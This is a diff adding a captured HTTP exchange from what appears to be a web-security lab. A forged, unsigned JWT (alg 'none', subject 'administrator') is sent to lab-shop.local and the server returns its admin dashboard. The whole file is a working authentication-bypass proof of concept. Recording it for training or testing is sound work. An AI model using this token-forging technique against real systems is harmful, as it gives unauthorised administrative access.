@@ -1,0 +1,10 @@
+GET /admin HTTP/1.1
+Host: lab-shop.local
+Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJwb3J0d2lnZ2VyIiwic3ViIjoiYWRtaW5pc3RyYXRvciIsImV4cCI6MTkwMDAwMDAwMH0.
+
+=== RESPONSE ===
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+<h1>Administrator Dashboard</h1>
+<p>Authenticated as subject: administrator (JWT alg=none accepted without signature verification)</p>
